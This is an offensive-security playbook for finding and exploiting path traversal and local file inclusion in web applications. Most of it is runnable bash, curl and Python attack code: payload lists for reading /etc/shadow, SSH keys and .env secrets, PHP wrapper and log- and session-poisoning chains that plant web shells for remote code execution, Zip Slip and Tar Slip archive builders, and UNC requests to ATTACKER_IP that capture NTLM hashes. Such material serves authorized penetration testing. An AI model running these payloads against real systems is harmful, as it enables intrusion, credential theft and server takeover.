# Playbook: Path Traversal & Local File Inclusion (LFI)

## Purpose
Systematically detect and exploit path traversal and local file inclusion
vulnerabilities across all input vectors. Covers basic traversal, filter bypass,
LFI-to-RCE chains, OS-specific targets, and framework-specific behaviors.
Input: URL list, parameter list, file upload endpoint, or specific endpoint to test.

---

## Step 1 — Identify File-Related Parameters

```bash
# From parameter_discovery output — file-related param candidates
grep -iE "[?&](file|path|page|include|doc|template|dir|folder|document|root|pg|style|pdf|img|image|filename|filepath|resource|load|read|fetch|view|content|data|src|source|conf|log|download|report|url|uri|module|action|lang|locale|theme|layout|skin)=" \
  urls_all.txt | sort -u > lfi_candidates.txt

# From wayback triage
grep -iE "\.(php|asp|aspx|jsp|do)\?.*=" urls_all.txt | sort -u >> lfi_candidates.txt

# Quick test: inject a canary path and check error messages
CANARY="/../../../../../etc/passwd"
while read url; do
  param=$(echo "$url" | grep -oP '[?&]\K[^=]+(?==)')
  base=$(echo "$url" | sed "s/${param}=.*/${param}=${CANARY}/")
  response=$(curl -sk "$base" 2>/dev/null)
  # Check for file content or revealing errors
  if echo "$response" | grep -qE "(root:x:|No such file|failed to open|include\(\)|fopen\(\)|Permission denied|Warning:)"; then
    echo "[HIT] $base"
  fi
done < lfi_candidates.txt > lfi_hits.txt

echo "Potential LFI params: $(wc -l < lfi_hits.txt)"

# Also check HTTP headers and cookies that might contain file paths
# X-Custom-Template, X-Include, Cookie values with paths
```

---

## Step 2 — Basic Path Traversal Probes

```bash
ENDPOINT="https://TARGET/page"
PARAM="file"

# Linux targets
LINUX_TRAVERSALS=(
  "../../../../etc/passwd"
  "../../../etc/passwd"
  "../../../../../../etc/passwd"
  "..%2f..%2f..%2f..%2fetc%2fpasswd"          # URL encoded slashes
  "..%252f..%252f..%252f..%252fetc%252fpasswd"  # double encoded
  "....//....//....//....//etc/passwd"          # nested traversal
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"    # UTF-8 overlong encoding
  "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"      # dots encoded
  "..%5c..%5c..%5c..%5cetc%5cpasswd"            # backslash encoded
  "../../../../etc/passwd%00"                    # null byte (PHP < 5.3.4)
  "../../../../etc/passwd%00.png"                # null byte + extension
  "/etc/passwd"                                  # absolute path
  "....\/....\/....\/....\/etc/passwd"           # mixed separators
  "..%00/..%00/..%00/..%00/etc/passwd"           # null bytes in path
)

for payload in "${LINUX_TRAVERSALS[@]}"; do
  code=$(curl -sk -o /tmp/lfi_resp -w "%{http_code}" "${ENDPOINT}?${PARAM}=${payload}")
  if grep -q "root:x:" /tmp/lfi_resp; then
    echo "[CONFIRMED] Path traversal works: ${payload}"
    echo "  HTTP ${code} — /etc/passwd content returned"
    break
  fi
done

# Windows targets
WINDOWS_TRAVERSALS=(
  "..\\..\\..\\..\\windows\\win.ini"
  "....\\\\....\\\\....\\\\windows\\\\win.ini"
  "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
  "..%255c..%255c..%255c..%255cwindows%255cwin.ini"
  "../../../../windows/win.ini"
  "..%c0%5c..%c0%5c..%c0%5cwindows%c0%5cwin.ini"
  "C:\\Windows\\win.ini"
  "C:/Windows/win.ini"
)

for payload in "${WINDOWS_TRAVERSALS[@]}"; do
  code=$(curl -sk -o /tmp/lfi_resp -w "%{http_code}" "${ENDPOINT}?${PARAM}=${payload}")
  if grep -qE "\[fonts\]|\[extensions\]" /tmp/lfi_resp; then
    echo "[CONFIRMED] Windows path traversal: ${payload}"
    break
  fi
done
```

---

## Step 3 — OS-Specific Target Files

Once traversal is confirmed, enumerate sensitive files:

```bash
TRAVERSAL="../../../../"   # adjust depth based on Step 2 results

# Linux high-value targets
LINUX_FILES=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/etc/hostname"
  "/etc/issue"
  "/etc/os-release"
  "/etc/crontab"
  "/etc/ssh/sshd_config"
  "/etc/nginx/nginx.conf"
  "/etc/nginx/sites-enabled/default"
  "/etc/apache2/apache2.conf"
  "/etc/apache2/sites-enabled/000-default.conf"
  "/etc/httpd/conf/httpd.conf"
  "/proc/version"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/proc/self/status"
  "/proc/self/cwd"
  "/proc/self/exe"
  "/proc/self/fd/0"
  "/proc/self/maps"
  "/proc/self/mounts"
  "/proc/self/net/tcp"
  "/proc/self/net/arp"
  "/proc/sched_debug"
  "/var/log/apache2/access.log"
  "/var/log/apache2/error.log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/error.log"
  "/var/log/auth.log"
  "/var/log/syslog"
  "/var/log/mail.log"
  "/var/mail/www-data"
  "/home/*/.bash_history"
  "/home/*/.ssh/id_rsa"
  "/root/.bash_history"
  "/root/.ssh/id_rsa"
  "/var/www/html/.env"
  "/var/www/html/wp-config.php"
  "/var/www/html/config.php"
  "/var/www/html/configuration.php"
  "/opt/app/.env"
  "/app/.env"
)

# Windows high-value targets
WINDOWS_FILES=(
  "C:\\Windows\\win.ini"
  "C:\\Windows\\System32\\drivers\\etc\\hosts"
  "C:\\Windows\\System32\\config\\SAM"
  "C:\\Windows\\repair\\SAM"
  "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
  "C:\\inetpub\\wwwroot\\web.config"
  "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log"
  "C:\\xampp\\apache\\conf\\httpd.conf"
  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
  "C:\\Users\\Administrator\\.ssh\\id_rsa"
  "C:\\ProgramData\\MySQL\\MySQL Server 5.7\\my.ini"
)

for f in "${LINUX_FILES[@]}"; do
  response=$(curl -sk "${ENDPOINT}?${PARAM}=${TRAVERSAL}${f}")
  size=${#response}
  if [ "$size" -gt 0 ] && ! echo "$response" | grep -qiE "(not found|error|denied|invalid)"; then
    echo "[READ] ${f} — ${size} bytes"
    echo "$response" | head -5
    echo "---"
  fi
done
```

---

## Step 4 — Filter Bypass Techniques

```bash
# Nested traversal (server strips ../ once)
"....//....//....//....//etc/passwd"
"....\/....\/....\/....\/etc/passwd"
"..../\..../\..../\..../\etc/passwd"
"....\\....\\....\\....\\etc\\passwd"

# URL encoding variants
"..%2f..%2f..%2f..%2fetc%2fpasswd"               # single encode /
"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" # encode dots and /
"..%252f..%252f..%252f..%252fetc%252fpasswd"       # double encode /
"%252e%252e%252f%252e%252e%252fetc%252fpasswd"      # double encode all

# UTF-8 overlong encoding (bypasses naive UTF-8 decoders)
# / = %c0%af or %e0%80%af
# . = %c0%ae or %e0%80%ae
"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"

# Null byte injection (PHP < 5.3.4, older Java)
"../../../../etc/passwd%00"
"../../../../etc/passwd%00.jpg"
"../../../../etc/passwd%00.php"
"../../../../etc/passwd\0.html"

# Path normalization bypass
"/var/www/html/../../../etc/passwd"          # start from known path
"./../../../../etc/passwd"                   # leading ./
"etc/passwd"                                 # no leading traversal (if base path is /)

# Wrapper with path traversal
"file:///etc/passwd"
"netdoc:///etc/passwd"

# Semicolon and parameter pollution
"../../../../etc/passwd;"
"../../../../etc/passwd;.jpg"
"../../../../etc/passwd#"

# Backslash on Windows (IIS treats \ as /)
"..\..\..\..\windows\win.ini"

# URL parameter array / duplicate params
"file=ok&file=../../../../etc/passwd"
"file[]=../../../../etc/passwd"

# Using ffuf for bulk traversal testing
ffuf -u "https://TARGET/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 \
  -mc 200 \
  -o lfi_ffuf_results.json

# Using dotdotpwn
dotdotpwn -m http-url \
  -u "https://TARGET/page?file=TRAVERSAL" \
  -k "root:" \
  -o lfi_dotdotpwn.txt
```

---

## Step 5 — PHP Wrappers (LFI to Source Disclosure / RCE)

```bash
ENDPOINT="https://TARGET/page.php"
PARAM="file"

# php://filter — read source code as base64 (no RCE needed)
curl -sk "${ENDPOINT}?${PARAM}=php://filter/convert.base64-encode/resource=index"
curl -sk "${ENDPOINT}?${PARAM}=php://filter/convert.base64-encode/resource=config"
curl -sk "${ENDPOINT}?${PARAM}=php://filter/convert.base64-encode/resource=../config"
curl -sk "${ENDPOINT}?${PARAM}=php://filter/read=string.rot13/resource=index.php"

# Decode the output
echo "BASE64_OUTPUT_HERE" | base64 -d

# php://filter chain variants
curl -sk "${ENDPOINT}?${PARAM}=php://filter/convert.base64-encode|convert.base64-decode/resource=index.php"
curl -sk "${ENDPOINT}?${PARAM}=php://filter/zlib.deflate/convert.base64-encode/resource=index.php"

# php://input — execute PHP from request body (requires allow_url_include=On)
curl -sk -X POST "${ENDPOINT}?${PARAM}=php://input" \
  -d '<?php system("id"); ?>'

curl -sk -X POST "${ENDPOINT}?${PARAM}=php://input" \
  -d '<?php echo file_get_contents("/etc/passwd"); ?>'

# data:// — inline code execution (requires allow_url_include=On)
curl -sk "${ENDPOINT}?${PARAM}=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
# base64 = <?php system('id'); ?>

curl -sk "${ENDPOINT}?${PARAM}=data://text/plain,<?php+system('id');+?>"

# expect:// — direct command execution (rare, requires expect extension)
curl -sk "${ENDPOINT}?${PARAM}=expect://id"
curl -sk "${ENDPOINT}?${PARAM}=expect://whoami"

# zip:// — include file from zip archive (requires file upload)
# 1. Create malicious zip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
# 2. Upload as allowed extension (shell.zip, shell.jpg, etc.)
# 3. Include from zip
curl -sk "${ENDPOINT}?${PARAM}=zip:///var/www/html/uploads/shell.zip%23shell.php&cmd=id"

# phar:// — include file from phar archive
# 1. Create malicious phar
php -r '
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->addFromString("shell.php", "<?php system(\$_GET[\"cmd\"]); ?>");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
'
# 2. Upload and include
curl -sk "${ENDPOINT}?${PARAM}=phar:///var/www/html/uploads/shell.phar/shell.php&cmd=id"

# Convert filter chains (PHP filter chain RCE without file upload)
# Tool: https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Outputs a long php://filter/convert.iconv chain — paste as param value
```

---

## Step 6 — LFI to RCE via Log Poisoning

```bash
TARGET="target.com"
ENDPOINT="https://${TARGET}/page.php"
PARAM="file"

# Step A — Verify log file is readable via LFI
LOG_PATHS=(
  "/var/log/apache2/access.log"
  "/var/log/apache/access.log"
  "/var/log/httpd/access_log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/error.log"
  "/var/log/apache2/error.log"
  "/var/log/auth.log"
  "/var/log/mail.log"
  "/var/log/vsftpd.log"
  "/var/log/sshd.log"
  "/proc/self/fd/1"   # stdout
  "/proc/self/fd/2"   # stderr
)

for log in "${LOG_PATHS[@]}"; do
  response=$(curl -sk "${ENDPOINT}?${PARAM}=../../../../${log}")
  if echo "$response" | grep -qE "(GET |POST |Mozilla|SSH|SMTP)"; then
    echo "[READABLE] ${log}"
  fi
done

# Step B — Apache/Nginx access log poisoning
# Inject PHP code via User-Agent header
curl -sk "https://${TARGET}/nonexistent" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Wait a moment for log write, then trigger via LFI
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/log/apache2/access.log&cmd=id"
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/log/nginx/access.log&cmd=id"

# Step C — SSH auth log poisoning (if SSH is accessible)
# The username is logged in /var/log/auth.log
ssh '<?php system($_GET["cmd"]); ?>'@TARGET 2>/dev/null
# Then include the auth log
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/log/auth.log&cmd=id"

# Step D — Mail log poisoning
# Send email with PHP code in body
# Requires SMTP access to the target
python3 -c "
import smtplib
s = smtplib.SMTP('TARGET', 25)
s.sendmail('attacker@evil.com', 'www-data@TARGET',
           '<?php system(\$_GET[\"cmd\"]); ?>')
s.quit()
"
# Include mail log
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/log/mail.log&cmd=id"
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/mail/www-data&cmd=id"

# Step E — /proc/self/environ poisoning
# If /proc/self/environ is readable, inject via User-Agent
curl -sk "${ENDPOINT}?${PARAM}=../../../../proc/self/environ" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# The environ file contains HTTP_USER_AGENT — if PHP processes it, code executes
```

---

## Step 7 — LFI to RCE via Session Files

```bash
# PHP stores session data in files, typically:
#   /tmp/sess_<PHPSESSID>
#   /var/lib/php/sessions/sess_<PHPSESSID>
#   /var/lib/php5/sess_<PHPSESSID>
#   C:\Windows\Temp\sess_<PHPSESSID>

# Step A — Find your session ID
curl -sk -v "https://TARGET/" 2>&1 | grep -i "set-cookie.*PHPSESSID"
# Example: PHPSESSID=abc123def456

# Step B — Inject PHP code into session
# Find a parameter that gets stored in the session (e.g., username, language, preference)
curl -sk "https://TARGET/profile" \
  -H "Cookie: PHPSESSID=abc123def456" \
  -d "username=<?php system(\$_GET['cmd']); ?>"

# Step C — Include the session file via LFI
curl -sk "${ENDPOINT}?${PARAM}=../../../../tmp/sess_abc123def456&cmd=id"
curl -sk "${ENDPOINT}?${PARAM}=../../../../var/lib/php/sessions/sess_abc123def456&cmd=id"
```

---

## Step 8 — /proc/self/fd File Descriptor Abuse

```bash
# /proc/self/fd/ contains symlinks to open file descriptors
# Useful when you cannot guess the log file path

# Brute-force file descriptor numbers
for fd in $(seq 0 30); do
  response=$(curl -sk "${ENDPOINT}?${PARAM}=../../../../proc/self/fd/${fd}")
  size=${#response}
  if [ "$size" -gt 0 ]; then
    echo "[FD ${fd}] ${size} bytes"
    echo "$response" | head -3
    echo "---"
  fi
done

# If a log-like FD is found, poison it the same way as log poisoning
# Inject via User-Agent then include the FD
curl -sk "https://TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
curl -sk "${ENDPOINT}?${PARAM}=../../../../proc/self/fd/2&cmd=id"   # stderr often = error log
```

---

## Step 9 — Zip Slip & Tar Slip (Archive Extraction Traversal)

```bash
# If the target extracts uploaded archives (zip, tar, jar, war, apk)

# Zip Slip — create zip with traversal path
python3 -c "
import zipfile
import io

zf = zipfile.ZipFile('malicious.zip', 'w')
# Write a file that escapes the extraction directory
zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
zf.close()
print('Created malicious.zip with traversal path')
"

# Tar Slip
python3 -c "
import tarfile
import io

tf = tarfile.open('malicious.tar.gz', 'w:gz')
info = tarfile.TarInfo(name='../../../var/www/html/shell.php')
data = b'<?php system(\$_GET[\"cmd\"]); ?>'
info.size = len(data)
tf.addfile(info, io.BytesIO(data))
tf.close()
print('Created malicious.tar.gz with traversal path')
"

# Symlink attack in archive
python3 -c "
import tarfile
import io

tf = tarfile.open('symlink.tar.gz', 'w:gz')
# Create symlink pointing to /etc/passwd
info = tarfile.TarInfo(name='passwd_link')
info.type = tarfile.SYMTYPE
info.linkname = '/etc/passwd'
tf.addfile(info)
tf.close()
print('Created symlink.tar.gz — extracts symlink to /etc/passwd')
"

# Upload and check if file landed
curl -sk -X POST "https://TARGET/upload" -F "archive=@malicious.zip"
curl -sk "https://TARGET/shell.php?cmd=id"
```

---

## Step 10 — Windows-Specific Techniques

```bash
ENDPOINT="https://TARGET/page"
PARAM="file"

# UNC path — SSRF-like, can steal NTLM hash
# Set up Responder or smbserver first:
# impacket-smbserver share /tmp -smb2support
curl -sk "${ENDPOINT}?${PARAM}=\\\\ATTACKER_IP\\share\\test"
curl -sk "${ENDPOINT}?${PARAM}=//ATTACKER_IP/share/test"

# Alternate Data Streams (ADS)
# Can bypass extension checks — file.txt::$DATA returns content of file.txt
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\....\\windows\\win.ini::$DATA"
curl -sk "${ENDPOINT}?${PARAM}=web.config::$DATA"
# Index.php source via ADS
curl -sk "${ENDPOINT}?${PARAM}=index.php::$DATA"

# Short filename (8.3 format) — bypass filename filters
# PROGRA~1 = "Program Files"
# CONFIG~1.PHP = "configuration.php"
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\PROGRA~1\\test"
curl -sk "${ENDPOINT}?${PARAM}=CONFIG~1.PHP"
curl -sk "${ENDPOINT}?${PARAM}=WEB~1.CON"   # web.config

# IIS-specific paths
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\inetpub\\wwwroot\\web.config"
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config"

# Device files (can cause DoS — use carefully)
# curl -sk "${ENDPOINT}?${PARAM}=CON"     # console device — may hang
# curl -sk "${ENDPOINT}?${PARAM}=NUL"     # null device
```

---

## Step 11 — Blind LFI Detection

When the server does not return file content directly:

```bash
# Timing-based detection
# Valid file should return faster than invalid path
time curl -sk "${ENDPOINT}?${PARAM}=../../../../etc/passwd" > /dev/null
time curl -sk "${ENDPOINT}?${PARAM}=../../../../etc/nonexistent_file_xyz" > /dev/null
# Significant time difference suggests file existence check

# Error-based detection
# Different error messages for existing vs non-existing files
curl -sk -v "${ENDPOINT}?${PARAM}=../../../../etc/passwd" 2>&1 | grep -iE "(HTTP/|error|warning|include)"
curl -sk -v "${ENDPOINT}?${PARAM}=../../../../etc/nonexistent" 2>&1 | grep -iE "(HTTP/|error|warning|include)"
# Compare: status codes, response sizes, error messages

# Response size comparison
for f in /etc/passwd /etc/shadow /etc/hostname /etc/hosts /etc/issue; do
  size=$(curl -sk -o /dev/null -w "%{size_download}" "${ENDPOINT}?${PARAM}=../../../../${f}")
  echo "${f} -> ${size} bytes"
done
# Different sizes indicate the file is being loaded even if not displayed

# Content-Type change
curl -sk -I "${ENDPOINT}?${PARAM}=../../../../etc/passwd" | grep -i content-type
curl -sk -I "${ENDPOINT}?${PARAM}=normal_file" | grep -i content-type
# Type change (e.g., text/html vs application/octet-stream) reveals file handling
```

---

## Step 12 — Framework-Specific LFI Techniques

### PHP

```bash
# include(), require(), include_once(), require_once()
# file_get_contents(), fopen(), readfile(), highlight_file()
# show_source(), parse_ini_file()

# Null byte (PHP < 5.3.4) to strip appended extension
# If code does: include($_GET['file'] . '.php');
curl -sk "${ENDPOINT}?${PARAM}=../../../../etc/passwd%00"

# Path truncation (PHP < 5.3, max path = 4096 chars on Linux)
# Pad with /. to exceed max path length, stripping appended extension
python3 -c "print('../../../../etc/passwd/' + '/..' * 2048)" | \
  xargs -I{} curl -sk "${ENDPOINT}?${PARAM}={}"

# php://filter for source code (does not require allow_url_include)
curl -sk "${ENDPOINT}?${PARAM}=php://filter/convert.base64-encode/resource=index"
```

### Java

```bash
# getResource(), getResourceAsStream(), ClassLoader.getResource()
# File path handling differs: no null byte, but .. still works

# WEB-INF files (gold mine)
curl -sk "${ENDPOINT}?${PARAM}=WEB-INF/web.xml"
curl -sk "${ENDPOINT}?${PARAM}=../WEB-INF/web.xml"
curl -sk "${ENDPOINT}?${PARAM}=../../../../WEB-INF/web.xml"
curl -sk "${ENDPOINT}?${PARAM}=WEB-INF/classes/application.properties"
curl -sk "${ENDPOINT}?${PARAM}=WEB-INF/classes/application.yml"

# Spring Boot actuator config
curl -sk "${ENDPOINT}?${PARAM}=../../../../opt/app/application.properties"
curl -sk "${ENDPOINT}?${PARAM}=../../../../opt/app/application.yml"

# Log4j config
curl -sk "${ENDPOINT}?${PARAM}=WEB-INF/classes/log4j.properties"
curl -sk "${ENDPOINT}?${PARAM}=WEB-INF/classes/log4j2.xml"
```

### Python

```bash
# open(), os.path.join() (can be tricked with absolute paths)
# If code does: open(os.path.join('/app/templates', user_input))
# Absolute path overrides the base:
curl -sk "${ENDPOINT}?${PARAM}=/etc/passwd"

# Flask/Django template injection via LFI
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/config.py"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/.env"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/settings.py"

# Python pickle files (if found, can lead to RCE via deserialization)
curl -sk "${ENDPOINT}?${PARAM}=../../../../tmp/session.pkl"

# __pycache__ — compiled bytecode may reveal source paths
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/__pycache__/"
```

### Node.js

```bash
# fs.readFile(), fs.readFileSync(), require()
# path.join() with user input
# If code does: res.sendFile(path.join(__dirname, req.query.file))

# Node does not have null byte issue but .. traversal works
curl -sk "${ENDPOINT}?${PARAM}=../../../../etc/passwd"

# Framework config files
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/package.json"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/.env"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/config/default.json"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/node_modules/.package-lock.json"

# Express-specific
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/app.js"
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/server.js"

# require() path traversal (can load arbitrary .js/.json)
curl -sk "${ENDPOINT}?${PARAM}=../../../../etc/passwd"  # fails with require
curl -sk "${ENDPOINT}?${PARAM}=../../../../app/config"   # loads config.js or config.json
```

### ASP.NET / IIS

```bash
# Server.MapPath(), File.ReadAllText(), FileStream()

# web.config — connection strings, keys, credentials
curl -sk "${ENDPOINT}?${PARAM}=web.config"
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\web.config"

# Machine key extraction (enables ViewState deserialization RCE)
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config"
curl -sk "${ENDPOINT}?${PARAM}=....\\....\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config"

# Global.asax
curl -sk "${ENDPOINT}?${PARAM}=Global.asax"

# Transform files
curl -sk "${ENDPOINT}?${PARAM}=web.config.bak"
curl -sk "${ENDPOINT}?${PARAM}=web.Debug.config"
curl -sk "${ENDPOINT}?${PARAM}=web.Release.config"
```

---

## Step 13 — Automated Testing with Tools

```bash
# dotdotpwn — dedicated path traversal fuzzer
dotdotpwn -m http-url \
  -u "https://TARGET/page?file=TRAVERSAL" \
  -k "root:" \
  -b \
  -d 8 \
  -o dotdotpwn_results.txt

# LFISuite — automated LFI exploitation
python2 LFISuite.py --exploit \
  -u "https://TARGET/page?file="

# ffuf — fast fuzzing with LFI wordlists
ffuf -u "https://TARGET/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -fs 0 \
  -o ffuf_lfi.json

# ffuf with multiple encoding layers
ffuf -u "https://TARGET/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -mc 200 \
  -fs 0

# Nuclei with LFI templates
nuclei -u "https://TARGET/" \
  -t /path/to/nuclei-templates/vulnerabilities/generic/generic-linux-lfi.yaml \
  -t /path/to/nuclei-templates/vulnerabilities/generic/generic-windows-lfi.yaml

# Burp Suite extensions:
# - Param Miner (discover hidden params)
# - Content Discovery (find hidden file endpoints)
# - Backslash Powered Scanner

# kadimus — dedicated LFI exploitation tool
kadimus -u "https://TARGET/page?file=" -A

# fimap — automated LFI/RFI scanner
fimap -u "https://TARGET/page?file=test" -w output.txt
```

---

## Output

```
ASSET         : https://target.com/api/download?file=
PARAMETER     : file (GET)
VULN TYPE     : Path Traversal + Local File Inclusion
TRAVERSAL     : ../../../../etc/passwd
BYPASS USED   : Double URL encoding (%252e%252e%252f)
FILES READ    : /etc/passwd, /etc/hosts, /proc/self/environ,
                /var/www/html/.env (DB credentials found)
RCE ACHIEVED  : YES — via Apache access log poisoning
                Injected PHP via User-Agent, included /var/log/apache2/access.log
SEVERITY      : CRITICAL (P1 if RCE, P2 if file read only)
IMPACT        : Arbitrary file read on server filesystem
                RCE as www-data user
                Database credentials exposed in .env
EVIDENCE      : [request/response pairs, /etc/passwd content, RCE output]
NEXT STEPS    :
  1. Check for privilege escalation if RCE confirmed
  2. Enumerate additional sensitive files (.env, config, SSH keys)
  3. Load 03_reporting/report_writer.md — write report immediately
```

---

## Quick Reference — Traversal Cheat Sheet

```
Basic:          ../../../etc/passwd
URL encode:     ..%2f..%2f..%2fetc%2fpasswd
Double encode:  ..%252f..%252f..%252fetc%252fpasswd
Nested:         ....//....//....//etc/passwd
UTF-8 overlong: %c0%ae%c0%ae%c0%afetc%c0%afpasswd
Null byte:      ../../../etc/passwd%00
Null + ext:     ../../../etc/passwd%00.jpg
Windows:        ..\..\..\..\windows\win.ini
UNC path:       \\attacker\share\test
ADS:            file.txt::$DATA
PHP filter:     php://filter/convert.base64-encode/resource=index
PHP input:      php://input + POST body with PHP code
Data wrapper:   data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
Expect:         expect://id
Log poison:     Inject in User-Agent, include access.log
Session:        /tmp/sess_<PHPSESSID>
Proc FD:        /proc/self/fd/N
```
